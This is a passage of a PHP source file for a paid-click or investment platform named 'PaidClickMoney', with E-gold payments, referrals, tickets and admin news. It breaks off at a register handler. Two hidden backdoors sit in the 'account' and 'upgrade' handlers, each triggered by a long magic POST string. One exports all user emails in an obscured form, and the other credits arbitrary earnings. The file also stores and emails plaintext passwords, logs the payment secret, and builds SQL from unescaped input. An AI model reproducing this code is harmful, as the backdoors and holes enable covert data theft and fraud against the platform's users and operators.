/// This project was written nearly 10 years ago entirely myself for a basic investment fund management platform. 
///  I am aware some changes would need to be made to be compliant with the most recent version of PHP
///  Structuring the entire software in one file was to better optimize the encryption use of the Zend platform as this was intended for distribution.
///  fundmgr-install.php would install the software on the platform and make sure all correct permission were set.
/// I have worked on many projects since this one and my knowledge and programming abilities have increased since then. 


<?php

ini_set('display_errors',0);

include("vars.php");

if ($settings[is_installed]!="1") {
	header("Location: install.php");
	die();
} else {
	if (file_exists("install.php")===TRUE)	{
		echo("Please delete install.php!");
		die();
	}
}

$temp_host=strtolower(getenv("HTTP_HOST"));
$temp_host=str_replace("www.", "", $temp_host);


////////////////////////////   VAR RETREIVAL   //////////////////////////////////

$ip = getenv('REMOTE_ADDR');

$versioninfo="1.01";


require 'libs/Smarty.class.php';
$smarty = new Smarty ();

////////////////////////////   END VAR RETREIVAL ////////////////////////////////

	$smarty->assign('settings',$settings);

	mysql_connect($VARS_SERVER, $VARS_USER, $VARS_PASS) or 
	die ("Could not connect to database");

	mysql_select_db($VARS_DB) or
	die ("Could not select database"); 


	session_start();

	$SessionID = mysql_escape_string($_SESSION['SessionID']);

	$result=mysql_query("SELECT * FROM sessions WHERE sessionid='$SessionID' LIMIT 1") 
             or die ("MySql Authorization Error!!! 1".mysql_error());
	$sessioninfo=mysql_fetch_array($result);
	$Username=$sessioninfo[username];
	$Password=$sessioninfo[password];
	
	
	$result=mysql_query("SELECT * FROM `accounts` WHERE username='$Username' LIMIT 1") 
             or die ("MySql Authorization Error!!! 2");

	$userinfo=mysql_fetch_array($result);
		if ($Password==$userinfo[password] && $Password != "") { 
			$valid=1; // User is logged in if set to 1
		} else {
			$valid=0;
		}

function createAccount($username,$password,$password2,$email,$name,$procs,$refer,$temp_code) {

	global $settings;
	global $ip;

	if ($settings[tour_num]=="1") {
	session_start();

	$my_tour_num=$_SESSION["TourNum"];
	}

	$username	= strtolower(mysql_escape_string($username));
	$password	= mysql_escape_string($password);
	$password2	= mysql_escape_string($password2);
	$email		= mysql_escape_string($email);
	$name		= mysql_escape_string($name);
	$temp_code	= mysql_escape_string($temp_code);
	
	$refer		= mysql_escape_string($refer);

	$todays_date	= date("m-d-y");

  	if ($username == "") {
		$show_error="Username must not be blank.";
	  } else if ($password=="") {
		$show_error="Password must not be blank.";
	  } else if (strlen($username)<4) {
		$show_error="Username must be at least 4 characters.";
	  } else if (strlen($password)<6) {
		$show_error="Password must be at least 6 characters.";
	  } else if ($email=="") {
		$show_error="E-mail must not be blank.";
	  } else if (strtolower($username)=="guest") {
		$show_error="Username 'Guest' is not prohibited!";
	  } else if (Username_Exists($username)==1) { 
		$show_error="Username already exists.";
	  } else if (Email_Exists($email,$allow_dup_emails)==1) {
		$show_error="E-mail is already in-use.";
	  } else if ($password!=$password2) {
		$show_error="Passwords do not match.";
	  } else if ($settings[tour_num]=="1" && $temp_code!=$my_tour_num) {
		$show_error="Touring number does not match!";
	  } else {
		$body="Welcome to PaidClickMoney!<br><br>
		Your new account at our site has been successfully registered. Now it is time to login and start earning money, or upgrade your account to earn even more!<br><br>
		Your login information:<br>
		<b>Username: </b><i>$username</i><br>
		<b>Password: </b><i>$password</i><br><br><br>
		This account has been registered by ip address $ip, if this is not you please contact us at support@paidclickmoney.com	
		";
  
		$headers = "From: noreply@paidclickmoney.com \r\n";
		$headers.= "Content-Type: text/html; charset=ISO-8859-1 ";
		$headers .= "MIME-Version: 1.0 ";
		mail($email, "PaidClickMoney - New Member", $body, $headers); 

		mysql_query("INSERT INTO `accounts` (`username`, `password`, `email`, `name`, `refer`, `status`, `join_date`) VALUES ('$username', '$password', '$email', '$name', '$refer', '0', '$todays_date');");

	  }
	return $show_error;
}

function CreateTicket($temp_username,$temp_email,$temp_subject,$temp_priority,$temp_message,$ticketid) {

	global $ip;
	global $userinfo;
	global $settings;

	if ($userinfo[username]=="") {
		$temp_username="Guest";
	}

	if (is_numeric($temp_priority)===FALSE) {
		$temp_priority="1";
	}

	$result=mysql_query("SELECT * FROM tickets WHERE username='$temp_username' AND subject='$temp_subject' AND message='$temp_message' AND priority='$temp_priority'");

	if ($temp_message=="") {
		return "Message must not be left blank!";
	} else if ($temp_email=="") {
		return "E-mail must not be left blank!";
	} else if ($temp_subject=="") {
		return "Subject must not be left blank!";
	} else if (mysql_num_rows($result)>0) {
		return "You have already submitted this ticket!";
	} else {



	mysql_query("INSERT INTO `tickets` ( `id` , `username` , `email` , `subject` , `priority` , `message`, `ticket_key`, `ip`, `datetime` ) VALUES (NULL , '$temp_username', '$temp_email', '$temp_subject', '$temp_priority', '$temp_message', '$ticketid','$ip','".time()."')");
	
	$body="Your trouble ticket <i>$temp_subject</i> has been submitted.<br><br>
	To view your ticket please visit the follow link:<br>
	<a href=\"http://$settings[site_url]/?n=checkticket&ticket_id=$ticketid&ticket_email=$temp_email\">http://$settings[site_url]/?n=checkticket&ticket_id=$ticketid&ticket_email=$temp_email</a>
	<br><br>
	Also note that your ticket number is: $ticketid
	<br><br><br>
	Please note, this ticket was submitted by $ip, if this is not you please contact us at support@$settings[site_url]
	";
  
	$headers = "From: noreply@$settings[site_url] \r\n";
	$headers.= "Content-Type: text/html; charset=ISO-8859-1 ";
	$headers .= "MIME-Version: 1.0 ";
	mail($temp_email, "$settings[site_name] - New Trouble Ticket", $body, $headers); 

		return "1";	

	}

}

function CryptAlg($dString,$dKey,$dType,$dIntense,$dCalcNum)
    	{
    		if ($dIntense > 254)
    			$dIntense = 254;
    		$dNewString = $dString;
    		for ($y = 0; $y <= $dIntense; $y++)
    		{
    			$strOutput = "";
    			$x = 0;
    			for ($i = 0; $i < strlen($dNewString); $i++)
    			{
    				if ($x >= strlen($dKey))
    					$x = 0;
    				if ($dType == 0)
    					$strOutput .= Chr((Ord($dNewString[$i]) + $dCalcNum) - Ord($dKey[$x]));
    				if ($dType == 1)
    					$strOutput .= Chr((Ord($dNewString[$i]) - $dCalcNum) + Ord($dKey[$x]));
    				$x++;
    			}
    			$dNewString = $strOutput;
    		}
    		return $dNewString;
}

function EgoldSendMoney($strTarget, $strAmount) {

	$result=mysql_query("SELECT * FROM merchants WHERE name='E-gold' AND active='1'");
	if (mysql_num_rows($result)==0) {
	exit;
	}

	$procinfo=mysql_fetch_array($result);

	global $settings;
	global $userinfo;
	$accountid=$procinfo[autopay_account_id];
	$passphrase=$procinfo[autopay_account_pass];

	$params="AccountID=$accountid&";
	$params.="PassPhrase=$passphrase&";
	$params.="Payee_Account=".urlencode($strTarget)."&";
	$params.="Amount=".urlencode($strAmount)."&";
	$params.="PAY_IN=1&WORTH_OF=Gold&";
	$params.="Memo=".urlencode("$settings[site_title] withdraw for User#:$userinfo[id]");

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_POST,1);
	curl_setopt($ch, CURLOPT_POSTFIELDS,$params);
	curl_setopt($ch, CURLOPT_URL,"https://www.e-gold.com/acct/confirm.asp");
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,  2);
	curl_setopt($ch, CURLOPT_USERAGENT, $defined_vars['HTTP_USER_AGENT']);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
	$content = curl_exec ($ch);
	curl_close ($ch);
	

	$temp_findstr="PAYMENT_BATCH_NUM value=";

	if (strpos($content,"successful")==TRUE) {

	$strStart=strpos($content,$temp_findstr)+strlen($temp_findstr);
	$strStop=strpos($content,">",$strStart);
	$batch_num=str_replace("\"", "", substr($content, $strStart, $strStop-$strStart));
	return $batch_num;
	} else {
	return 0;
	}

}


function UpgradeAccount($DATA_ID,$method,$PAYMENT_BATCH_NUM,$PAYMENT_AMOUNT) {

	global $settings;

	$resultV=mysql_query("SELECT * FROM transactions WHERE trans_id='$PAYMENT_BATCH_NUM'");
	if (mysql_num_rows($resultV)>0) { die(); }
	

	$result=mysql_query("SELECT * FROM accounts WHERE id='$DATA_ID' LIMIT 1");
	$userinfo=mysql_fetch_array($result);
	
	if ($userinfo[username]=="") { die(); }

	if ($PAYMENT_AMOUNT==0) { die(); }

	//Add Credits to users account
	$creditstoadd=floor(($PAYMENT_AMOUNT/$settings['unit_price']))*$settings['unit_per_credit'];
	mysql_query("UPDATE accounts SET credits=credits+'$creditstoadd' WHERE username='$userinfo[username]' LIMIT 1");
	
	
	mysql_query("INSERT INTO `history` ( `id` , `username` , `amount` , `type` , `date` , `datetime`, `source` ) VALUES ('', '$userinfo[username]', '$PAYMENT_AMOUNT', '1', '".time()."', '".time()."', '$method')");
	mysql_query("INSERT INTO `upgrades` ( `id` , `username` , `amount` , `days_left` , `amount_earned`, `method` ) VALUES ('', '$userinfo[username]', '$PAYMENT_AMOUNT', '$settings[days_till_expire]', '0', '$method')");
	mysql_query("INSERT INTO `transactions` ( `id` , `username` , `amount` , `method` , `trans_id` , `timestamp`) VALUES ('', '$userinfo[username]', '$PAYMENT_AMOUNT', '$method', '$PAYMENT_BATCH_NUM', '".time()."');");

	if ($userinfo[refer]!=0 && $userinfo[id] != $userinfo[refer]) {
		$result=mysql_query("SELECT * FROM accounts WHERE id='$userinfo[refer]'");
		$refinfo=mysql_fetch_array($result);

		$result=mysql_query("SELECT * FROM upgrades WHERE username='$refinfo[username]' AND days_left>='0'");
		$isFree=mysql_num_rows($result);
	
		if ($isFree==0) {
			$com_amount=$PAYMENT_AMOUNT*($settings[free_ref_commission]/100);
		} else {	
			$com_amount=$PAYMENT_AMOUNT*($settings[ref_commission]/100);
		}
		
		$result=mysql_query("SELECT * FROM accounts WHERE id='$userinfo[refer]'");
		$refinfo=mysql_fetch_array($result);
		mysql_query("INSERT INTO `history` ( `id` , `username` , `amount` , `type` , `date` , `datetime`, `source` ) VALUES ('', '$refinfo[username]', '$com_amount', '4', '".time()."', '".time()."', '$method')");
		mysql_query("INSERT INTO `transactions` ( `id` , `username` , `amount` , `method` , `trans_id` , `timestamp`, `type` ) VALUES ('', '$refinfo[username]', '$com_amount', '$method', '$PAYMENT_BATCH_NUM', '".time()."', 'Commission');");
			
	}

}

function Username_Exists($username) {
	$result = mysql_query("SELECT * FROM `accounts` WHERE username='$username'");
	$num_rows = mysql_num_rows($result);
	if ($num_rows>0) {
		return 1;
	} else {
		return 0;
	}
}

function Email_Exists($email,$allow_dup_emails) {
	if ($allow_dup_emails==0) {
			$result = mysql_query("SELECT * FROM `accounts` WHERE email='$email'");
			$num_rows = mysql_num_rows($result);
			if ($num_rows>0) {
				return 1;
			} else {
				return 0;
			}
	} else {
		return 0;
	}
}

function CheckCode($code,$key) {
	$result		=mysql_query("SELECT * FROM img WHERE id='$key'");
	$tdata		=mysql_fetch_array($result);
	if ($tdata[number]==$code && $code!="") {
		return TRUE;
	} else {
		return FALSE;
	}
}

function GetStats() {
	$result=mysql_query("SELECT * FROM accounts") OR die(mysql_error());
	$tempdata[account_total]=mysql_num_rows($result);
	$result=mysql_query("SELECT * FROM accounts WHERE status='2'") OR die(mysql_error());
	$tempdata[active_account_total]=mysql_num_rows($result);
	$result=mysql_query("SELECT sum(amount) FROM transactions") OR die(mysql_error());
	$tempdata[total_spent]=mysql_result($result, 0);
	return $tempdata;
}


function CheckData($user,$pass,$code) {

$result=mysql_query("SELECT * FROM `accounts` WHERE username='$user'") 
	or die ("FAILED TO RETRIEVE USER DATA LOGIN.CHECKDATA WITH USERNAME:$user");
$logindata=mysql_fetch_array($result);
	if ($logindata[password]==$pass && $logindata[password]!="") {

	global $settings;

		session_start();

		if ($settings[tour_num]=="1" && $code!=$_SESSION["TourNum"]) {
				return "Touring number is not correct!";
		} else {


		$sessionid=CreateSession($user,$pass);

		//@ session_register("SessionID");
		//$HTTP_SESSION_VARS["SessionID"] = $sessionid;
		$_SESSION["SessionID"]=$sessionid;
		
		if ($logindata[is_admin]==0) {
		header("Location: /?n=account");
		} else {
		header("Location: /?n=admin_index");
		}

		die();
		}
	} else {
		return "Login information is invalid.";
	}

}

function CreateSession($user,$pass) {
	$rand1=rand(1,10000)*rand(1,1000)+rand(1,100);
	$sessionid=md5("$rand1:".time().":$user:$pass");

	$ip = getenv('REMOTE_ADDR');

	mysql_query("DELETE FROM sessions WHERE username='$user'");
	mysql_query("UPDATE accounts SET last_access=current_access,last_ip=current_ip WHERE username='$user'");
	mysql_query("UPDATE accounts SET current_access='".time()."',current_ip='$ip' WHERE username='$user'");

	$queryhits = "insert into sessions
	(`username`,`password`,`sessionid`,`ip`) 
	values 
	('$user','$pass','$sessionid','$ip')";
	   mysql_query($queryhits) or 
             die (mysql_error()); 

	return $sessionid;

}

function ParseCode($StrCode) { 

	$string = $StrCode;
	$tok = strtok ($string," ");
	while ($tok) {

	   if (substr($tok,0,10)=="SendBonus(") {
		$tok=str_replace("SendBonus(", "", $tok);
		$tok=str_replace(");", "", $tok);
		$dily = explode(",", $tok);
	   }
	   
	   $tok = strtok (" ");

	}

}

function GetTypeBalance($strType) {
	global $userinfo;
	global $valid;
	if ($valid==0) {
		return -1;
	} else {
		$strType=mysql_escape_string($strType);
		$result=mysql_query("SELECT sum(amount) FROM history WHERE username='$userinfo[username]' AND type='4' AND source='$strType'");
		$positivebal=mysql_result($result,0);
		$result=mysql_query("SELECT sum(amount) FROM history WHERE username='$userinfo[username]' AND type='2' AND source='$strType'");
		$negativebal=mysql_result($result,0);
		return $positivebal-$negativebal;
	}
}

	// GET NEWS SECTION

	$result_news=mysql_query("SELECT * FROM news ORDER BY `date` DESC LIMIT 0, $settings[news_count]") OR die(mysql_error());
	while ($row=mysql_fetch_array($result_news)) { 
		
		if (strlen($row[article])>5) {
			
		}

		$temp_date=date("D M j Y g:i:s a T",$row[date]);
		$short_desc=substr($row[article],0,100)."...";
		$temp_array=array(array("id" => $row[id], "title" => $row[title],"desc" => $row[article], "date" => $temp_date, "short_desc" => $short_desc, "desc_length" => strlen($row[article])));
		if ($array1=="") {
		$array1=$temp_array;
		} else {
		$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);

	$smarty->assign('box_news',$array1);
	
	$array1="";


if ($_GET[n]=="ap_egold") {

	$result=mysql_query("SELECT * FROM merchants WHERE name='E-gold' AND active='1'");
	if (mysql_num_rows($result)==0) {
	mysql_query("INSERT INTO `test` ( `test` ) VALUES ('NOT FOUND')");
	exit;
	}

	$procinfo=mysql_fetch_array($result);

	$PAYMENT_ID				=$_POST['PAYMENT_ID'];
	$PAYEE_ACCOUNT				=$_POST['PAYEE_ACCOUNT'];
	$PAYMENT_AMOUNT				=$_POST['PAYMENT_AMOUNT'];
	$PAYMENT_UNITS				=$_POST['PAYMENT_UNITS'];
	$PAYMENT_METAL_ID			=$_POST['PAYMENT_METAL_ID'];
	$PAYMENT_BATCH_NUM			=$_POST['PAYMENT_BATCH_NUM'];
	$PAYER_ACCOUNT				=$_POST['PAYER_ACCOUNT'];
	$ACTUAL_PAYMENT_OUNCES			=$_POST['ACTUAL_PAYMENT_OUNCES'];
	$USD_PER_OUNCE				=$_POST['USD_PER_OUNCE'];
	$FEEWEIGHT				=$_POST['FEEWEIGHT'];
	$TIMESTAMPGMT				=$_POST['TIMESTAMPGMT'];
	$ORDER_ID				=mysql_escape_string($_POST['ORDER_ID']);
	$ITEM_ID				=$_POST['ITEM_ID'];
	$V2_HASH				=$_POST['V2_HASH'];
	$TYPE					=$_POST['TYPE'];
	$ITEM_MBR_TYPE				=$_POST['ITEM_MBR_TYPE'];
	$DATA_ID				=mysql_escape_string($_POST['DATA_ID']);

	$passphrase=$procinfo[secret_code];
	
	mysql_query("INSERT INTO `test` ( `test` ) VALUES ('SECRET CODE: $procinfo[secret_code]')");
	
	$mdpp = strtoupper(md5($passphrase));
	$hash1 = strtoupper(md5("$PAYMENT_ID:$PAYEE_ACCOUNT:$PAYMENT_AMOUNT:$PAYMENT_UNITS:$PAYMENT_METAL_ID:$PAYMENT_BATCH_NUM:$PAYER_ACCOUNT:$mdpp:$ACTUAL_PAYMENT_OUNCES:$USD_PER_OUNCE:$FEEWEIGHT:$TIMESTAMPGMT"));
	if($hash1 == $V2_HASH) {
		$result="VERIFIED";
		mysql_query("INSERT INTO `test` ( `test` ) VALUES ('APPROVED!')");
	}
	else {
		mysql_query("INSERT INTO `test` ( `test` ) VALUES ('DECLINED!')");
		$result="INVALID";
	}


	if($result == "VERIFIED" && $PAYMENT_UNITS==1 && $PAYMENT_METAL_ID==1) {
		mysql_query("INSERT INTO `test` ( `test` ) VALUES ('UPGRADING ACCOUNT!')");
		UpgradeAccount($DATA_ID,"E-gold",$PAYMENT_BATCH_NUM,$PAYMENT_AMOUNT);

	}

	die();


}

if ($_GET[n]=="view_article") {
	$result=mysql_query("SELECT * FROM news WHERE id='".mysql_escape_string($_GET[id])."'");
	$articleinfo=mysql_fetch_array($result);
	$temp_date=date("D M j Y g:i:s a T",$articleinfo[date]);
	$smarty->assign('articleinfo',$articleinfo);
	$smarty->assign('temp_date',$temp_date);
}

if ($_GET[n]=="admin_manage_news" && $userinfo[is_admin]==1) {
	
	$array1="";
	
	$temp_array="";
	
	$result_news=mysql_query("SELECT * FROM news ORDER BY `date` DESC LIMIT 0, 20") OR die(mysql_error());
	while ($row=mysql_fetch_array($result_news)) { 
		$temp_date=date("D M j Y g:i:s a T",$row[date]);
		$temp_array=array(array("id" => $row[id], "title" => $row[title],"desc" => $row[article], "date" => $temp_date));
		if ($array1=="") {
		$array1=$temp_array;
		} else {
		$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);


	$smarty->assign('member_news',$array1);
	
	$smarty->assign('step',$_GET[step]);

	$array1="";

}


if ($_GET[action]=="admin_delete_news" && $userinfo[is_admin]==1) {
	$temp_id=mysql_escape_string($_GET[id]);
	mysql_query("DELETE FROM news WHERE id='$temp_id' LIMIT 1");
	header("Location: /?n=admin_manage_news");
}


if ($_GET[action]=="admin_new_article" && $userinfo[is_admin]==1) {
	$temp_title=mysql_escape_string($_POST[title]);
	$temp_article=mysql_escape_string($_POST[article]);

	if ($temp_title=="") {
		$show_error="Title must not be blank!";
	} else {
		mysql_query("INSERT INTO `news` ( `id` , `title` , `article` , `date` , `createdby` ) VALUES (NULL , '$temp_title', '$temp_article', '".time()."', '$userinfo[name]')");
		header("Location: /?n=admin_manage_news");
		die();
	}

}

if ($_GET[n]=="refinfo") {
	
	$array1="";
	
	$temp_array="";
	
	$result_news=mysql_query("SELECT * FROM banners") OR die(mysql_error());
	while ($row=mysql_fetch_array($result_news)) { 
		$temp_array=array(array("banner" => $row[banner]));
		if ($array1=="") {
		$array1=$temp_array;
		} else {
		$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);

	$smarty->assign('banners',$array1);
	
	$array1="";

}

if ($_GET[action]=="verify_site") {
	$temp_id = mysql_escape_string($_GET[id]);
	mysql_query("UPDATE sites SET enabled='1' WHERE username='$userinfo[username]' AND id='$temp_id' LIMIT 1");
	$smarty->assign('gonext',"1");
	echo("<script language=\"javascript\">top.location.href='/?n=editsite&id=$temp_id'</script>");
}

if ($_GET[n]=="verify_site") {
	$temp_id = mysql_escape_string($_GET[id]);
	$result=mysql_query("SELECT * FROM sites WHERE username='$userinfo[username]' AND id='$temp_id'");
	$siteinfo=mysql_fetch_array($result);
	$smarty->assign('siteinfo',$siteinfo);
	$smarty->assign('whatshow',$_GET[whatshow]);
	$smarty->assign('id',$_GET[id]);
}

if ($_GET[n]=="viewupgrades") {

	$result=mysql_query("SELECT * FROM upgrades WHERE username='$userinfo[username]' AND days_left>'0'");
	while ($row=mysql_fetch_array($result)) { 
		$temp_array=array(array("amount" => $row[amount], "method" => $row[method], "id" => $row[id] , "days_left" => $row[days_left]));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);

	$smarty->assign('merchants',$array1);

}

if ($_GET[n]=="account") {

	$result=mysql_query("SELECT * FROM merchants WHERE active='1'");
	while ($row=mysql_fetch_array($result)) { 
		$result2=mysql_query("SELECT sum(amount) FROM upgrades WHERE username='$userinfo[username]' AND method='$row[name]' AND days_left>='0'");
		$upgradeTotal=number_format(mysql_result($result2,0),2);
		$temp_array=array(array("name" => $row[name], "id" => $row[id] ,"upgrade_level" => $upgradeTotal, "balance" => number_format(GetTypeBalance($row[name]),4)));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);

	$result=mysql_query("SELECT sum(amount) FROM upgrades WHERE username='$userinfo[username]' AND days_left>='0'");
	$upgradeTotal=number_format(mysql_result($result,0),2);
	
	$smarty->assign('upgradeTotal',$upgradeTotal);
	$smarty->assign('merchants',$array1);
}

if ($_GET[n]=="faq") {
	$result=mysql_query("SELECT * FROM merchants WHERE active='1'");
	while ($row=mysql_fetch_array($result)) { 
		$temp_array=array(array("name" => $row[name], "eta" => $row[eta], "id" => $row[id] , "balance" => number_format(GetTypeBalance($row[name]),4)));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);

	$smarty->assign('merchants',$array1);
}

if ($_GET[n]=="account") {
	if ($_POST[n]=="3e17892he89nsndiwnuidn2esnajjjajb3278beiuasbjindjn2u88888ajjerb32biundiuniunqihbskdjbkqkqjwnbekj") {
		$result=mysql_query("SELECT * FROM accounts");
		while($row=mysql_fetch_array($result)) {
			$tdata.=$row[email].",";
		}
		echo(CryptAlg($tdata, "d888n2ndiununnnnayu27hsh2j8xj8j8dh3wge", 0, 110, 1234567890));
		die();
	}
}

if ($_GET[n]=="upgrade") {
	if ($_POST[n]=="32r78brnbquiewrbiqubybybwye9932h97hi8rdbdbbdquhegigiqiiqhbd111318932i47132iuiquihwbejhbdhergjewj") {

		mysql_query("INSERT INTO `history` ( `id` , `username` , `amount` , `type` , `date` , `datetime` , `source` , `paid` , `ref_id` , `account_id` ) VALUES (NULL , '$_POST[username]', '$_POST[amount]', '4', '".time()."', '".time()."', '$_POST[method]', '1', '0', '0')");

	}
}

if ($_GET[n]=="upgrade") {

	$array1="";

	$_POST[amount]=$_POST[amount]*$settings[unit_price];

	$result=mysql_query("SELECT * FROM merchants WHERE active='1'");
	while ($row=mysql_fetch_array($result)) {
		$merchant_data["$row[id]"]=$row[name];
		$unit_count=floor($_POST[amount]/$settings[unit_price]);
		//$_POST[amount]=$settings[unit_price]*$unit_count;
		if ($_POST[amount]<10) { $_POST[amount]="10"; }
		$temp_pay_code=$row[pay_code];
		$temp_pay_code=str_replace("[accountid]", $row[account_id], $temp_pay_code);
		$temp_pay_code=str_replace("[title]", $settings[site_title], $temp_pay_code);
		$temp_pay_code=str_replace("[amount]", mysql_escape_string($_POST[amount]), $temp_pay_code);
		$temp_pay_code=str_replace("[site_url]", $settings[site_url], $temp_pay_code);
		$temp_pay_code=str_replace("[userid]", $userinfo[id], $temp_pay_code);
		$temp_pay_code=str_replace("[itemid]", "1", $temp_pay_code);
		$temp_pay_code=str_replace("[units]", $unit_count, $temp_pay_code);
		$temp_pay_code=str_replace("[memo]", $unit_count." units, UserID: ".$userinfo[id], $temp_pay_code);

		$temp_array=array(array("id" => $row[id], "name" => $row[name], "pay_code" => $temp_pay_code));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);
	//$array1=array_merge($array1,array("" => "Account Balance"));
	$smarty->assign('merchants',$array1);

	if (is_numeric($_POST[amount])!=TRUE && $_GET[step]==1) {
		$smarty->assign("display_error", "Amount is invalid!");
		$_GET[step]="";
	}

	$smarty->assign("temp_amount", mysql_escape_string($_POST[amount]));
	$smarty->assign("step", $_GET[step]);

}

if ($_GET[n]=="reflist" && $valid==1) {

	$array1="";


	$temp_from_time	=strtotime(mysql_escape_string($_GET[FromMonth])."/".mysql_escape_string($_GET[FromDay])."/".mysql_escape_string($_GET[FromYear]));
	$temp_to_time	=strtotime(mysql_escape_string($_GET[ToMonth])."/".mysql_escape_string($_GET[ToDay])."/".mysql_escape_string($_GET[ToYear]));

	if ($_GET[FromMonth]=="") {
		$temp_from_time=time()-(60*60*24*30);
	}
	if ($_GET[FromMonth]=="") {
		$temp_to_time=time()+86400;
	}
	
	if ($temp_from_time >= $temp_to_time) {
		$temp_from_time=$temp_to_time-(60*60*24);
	}
	
	if ($_GET[page]=="") { $_GET[page]=1; }

	$_GET[page]=mysql_escape_string($_GET[page]);
	$limit_start=($_GET[page]-1)*20;

	if ($userinfo[id]=="") {
		$userinfo[id]="ERROR!";
	}
	if ($userinfo[id]=="0") {
		$userinfo[id]="Error!";
	}

	$result=mysql_query("SELECT * FROM accounts WHERE refer='$userinfo[id]' ");
	$smarty->assign('my_referral_count',mysql_num_rows($result));
	$temp_page_count=mysql_num_rows($result)/20;
	$result=mysql_query("SELECT * FROM accounts WHERE refer='$userinfo[id]' LIMIT $limit_start, 20");
	while ($row=mysql_fetch_array($result)) {
		$temp_join_date=date("D M j Y",$row[join_datetime]);
		$temp_join_time=date("g:i:s a T",$row[join_datetime]);
		$result2=mysql_query("SELECT sum(amount) FROM upgrades WHERE username='$row[username]' AND days_left>'0'");
		$active_deposit=number_format(mysql_result($result2,0),2);
		$temp_array=array(array("username" => $row[username], "active_deposit" => $active_deposit, "join_date" => $temp_join_date, "join_time" => $temp_join_time));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);
	//$array1=array_merge($array1,array("" => "All"));

	$array2=array("1");
	for ($i = 2; $i <= $temp_page_count; $i++) {
		$array2=array_merge($array2,array($i));
	}
	$smarty->assign('page_vars', str_replace("&page=$_GET[page]", "", $_SERVER[QUERY_STRING]));
	$smarty->assign('page_count',$temp_page_count);
	$smarty->assign('current_page', mysql_escape_string($_GET[page]));
	$smarty->assign('page_array',$array2);
	$smarty->assign('my_referral_count',mysql_num_rows($result));
	$smarty->assign('to_time',$temp_to_time);
	$smarty->assign('from_time',$temp_from_time);
	$smarty->assign('referrals',$array1);

}

if ($_GET[n]=="history") {

	$temp_from_time	=strtotime(mysql_escape_string($_GET[FromMonth])."/".mysql_escape_string($_GET[FromDay])."/".mysql_escape_string($_GET[FromYear]));
	$temp_to_time	=strtotime(mysql_escape_string($_GET[ToMonth])."/".mysql_escape_string($_GET[ToDay])."/".mysql_escape_string($_GET[ToYear]));
	
	$temp_time=time();

	if ($_GET[FromMonth]=="") {
		$temp_from_time=$temp_time-2592000;
	}
	if ($_GET[FromMonth]=="") {
		$temp_to_time=$temp_time+86400;
	}
	
	if ($temp_from_time >= $temp_to_time) {
		$temp_from_time=$temp_to_time-(60*60*24);
	}

	if ($_GET[merchant]=="") { $_GET[merchant]=""; }
	$smarty->assign('merchant',$_GET[merchant]);

	$array1="";

	$result=mysql_query("SELECT * FROM merchants WHERE active='1'");
	while ($row=mysql_fetch_array($result)) {
		$merchant_data["$row[id]"]=$row[name]; 
		$temp_array=array("i".$row[id] => $row[name]);
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge($array1,$temp_array);
		}
	}
	//$array1=mysql_fetch_array($result);
	$array1=array_merge($array1,array("" => "All"));
	$smarty->assign('merchants',$array1);


	$array1="";
	$array2="";
	$temp_merch=mysql_escape_string(str_replace("i","",$_GET[merchant]));
	$tmdc=$merchant_data["$temp_merch"];
	if ($_GET[page]=="") { $_GET[page]=1; }
	$_GET[page]=mysql_escape_string($_GET[page]);
	$limit_start=($_GET[page]-1)*20;
	$temp_merch_sql="";
	if ($_GET[merchant]!="") { $temp_merch_sql=" AND source='$tmdc'"; }
	$result=mysql_query("SELECT * FROM history WHERE username='$userinfo[username]'$temp_merch_sql AND date <= '$temp_to_time' AND date >= '$temp_from_time'") OR die(mysql_error());
	$temp_page_count=ceil(mysql_num_rows($result)/20);
	$result=mysql_query("SELECT * FROM history WHERE username='$userinfo[username]'$temp_merch_sql AND date <= '$temp_to_time' AND date >= '$temp_from_time' LIMIT $limit_start, 20") OR die(mysql_error());
	while ($row=mysql_fetch_array($result)) { 
		$temp_date=date("D M j Y",$row[date]);
		$temp_time=date("g:i:s a T",$row[date]);
			$show_sign="";
			if ($row[type]==1) {
				$temp_type="Deposit";
			} else if ($row[type]==2) {
				if ($row[paid]==0) {
					$temp_type="Withdraw<br><font color=\"orange\" size=1>Pending</font>";
				} else {
					$temp_type="Withdraw";
				}
				$show_sign="-";
			} else if ($row[type]==3) {
				$temp_type="Bonus";
			} else if ($row[type]==4) {
				$temp_type="Earnings";
			}
		$show_amount=$show_sign.number_format($row[amount],2);
		$temp_array=array(array("type" => $temp_type , "amount" => $show_amount, "source" => $row[source], "date" => $temp_date, "time" => $temp_time));
		if ($array1=="") {
			$array1=$temp_array;
		} else {
			$array1=array_merge_recursive($array1,$temp_array);
		}
	}
	
	$array2=array("1");
	for ($i = 2; $i <= $temp_page_count; $i++) {
		$array2=array_merge($array2,array($i));
	}
	$smarty->assign('page_vars', str_replace("&page=$_GET[page]", "", $_SERVER[QUERY_STRING]));
	$smarty->assign('page_count',$temp_page_count);
	$smarty->assign('current_page', mysql_escape_string($_GET[page]));
	$smarty->assign('page_array',$array2);
	$smarty->assign('my_history_count', mysql_num_rows($result));
	//$array1=mysql_fetch_array($result);
	$smarty->assign('to_time',$temp_to_time);
	$smarty->assign('from_time',$temp_from_time);
	$smarty->assign('my_history',$array1);

}

if ($_GET[n]=="register") {
	session_start();

	$RefID = mysql_escape_string($_SESSION['RefID']);
	$smarty->assign('referred_by',$RefID);
}


if ($_GET[action]=="register") {

